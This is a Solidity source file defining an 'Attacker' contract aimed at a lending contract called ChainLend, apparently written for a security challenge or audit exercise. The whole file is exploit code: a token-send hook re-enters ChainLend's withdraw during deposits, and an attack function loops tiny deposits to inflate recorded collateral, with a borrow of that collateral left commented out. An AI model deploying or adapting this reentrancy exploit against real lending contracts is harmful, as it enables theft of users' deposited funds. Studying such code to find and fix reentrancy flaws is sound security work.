// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



import {ChainLend} from "./ChainLend.sol";
contract Attacker {


    uint256 private s_depositCount;
    uint256 private s_firstAmount;
    uint256 private s_numberOfDeposits;
    ChainLend private immutable i_ChainLend;

    constructor(address _ChainLend, uint256 _numberOfDeposits) {
        i_ChainLend = ChainLend(_ChainLend);
        s_numberOfDeposits = _numberOfDeposits;
    }


    function deposit(uint256 amount) public {
        i_ChainLend.deposit(amount);
        if(s_depositCount == 0) {
            s_firstAmount = amount;
        }
    }

    function tokensToSend(address operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData) external {
        if (s_depositCount == 0) {
            s_depositCount++;
        }else {
            i_ChainLend.withdraw(9);
        }
    }

    function getInterfaceImplementer() external pure returns (bool) {
        return true;
    }

    function attack() public {
        uint256 numberOfDeposits = s_numberOfDeposits;
        for(uint256 i = 0; i < numberOfDeposits; i++) {
            i_ChainLend.deposit(1);
        }
        uint256 totalCollateral = i_ChainLend.deposits(address(this));
        // i_ChainLend.borrow(totalCollateral);
    }

}